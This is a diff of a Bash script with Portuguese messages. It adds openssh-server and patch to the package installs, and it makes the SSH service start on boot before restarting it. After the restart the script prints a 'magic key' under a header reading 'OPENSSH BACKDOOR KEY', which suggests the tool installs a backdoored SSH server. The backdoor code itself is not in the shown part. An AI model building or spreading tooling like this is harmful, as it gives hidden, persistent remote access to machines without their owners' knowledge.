@@ -37,13 +37,13 @@ install_deps(){
   msg "Verificando dependências..."
   if command -v apt-get >/dev/null 2>&1; then
     apt-get update -qq
-    apt-get install -y build-essential autoconf libtool gcc make wget xz-utils checkinstall libsystemd-dev
+    apt-get install -y build-essential autoconf libtool gcc make wget xz-utils checkinstall libsystemd-dev openssh-server patch
   elif command -v dnf >/dev/null 2>&1; then
     dnf groupinstall -y "Development Tools"
-    dnf install -y systemd-devel xz wget
+    dnf install -y systemd-devel xz wget openssh-server patch libtool autoconf
   elif command -v zypper >/dev/null 2>&1; then
     zypper refresh
-    zypper install -y gcc make autoconf libtool wget xz checkinstall systemd-devel
+    zypper install -y gcc make autoconf libtool wget xz checkinstall systemd-devel openssh-server patch
   fi
 }
 
@@ -166,8 +166,13 @@ f_restart_ssh(){
   printf "${YELLOW}Reiniciar SSH agora? (s/N):${NC} "; read -r conf
   [[ $conf =~ ^[Ss]$ ]] || { menu_principal; return; }
 
-  systemctl restart ssh || die "Falha ao restartar ssh"
-  ok "SSH reiniciado. Teste com: ssh usuario@localhost"
+  local ssh_svc="ssh"
+  systemctl list-unit-files | grep -q "^sshd.service" && ssh_svc="sshd"
+
+  msg "Reiniciando serviço: $ssh_svc"
+  systemctl enable "$ssh_svc" || true
+  systemctl restart "$ssh_svc" || die "Falha ao restartar $ssh_svc"
+  ok "SSH ($ssh_svc) reiniciado e habilitado. Teste com: ssh usuario@localhost"
   echo "Use a chave mágica:"
   echo "-----BEGIN OPENSSH BACKDOOR KEY-----"
   echo "AAAAE2VjZS5waHA6Ly8vanVzdC1hLXRlc3QtY2Fsb"
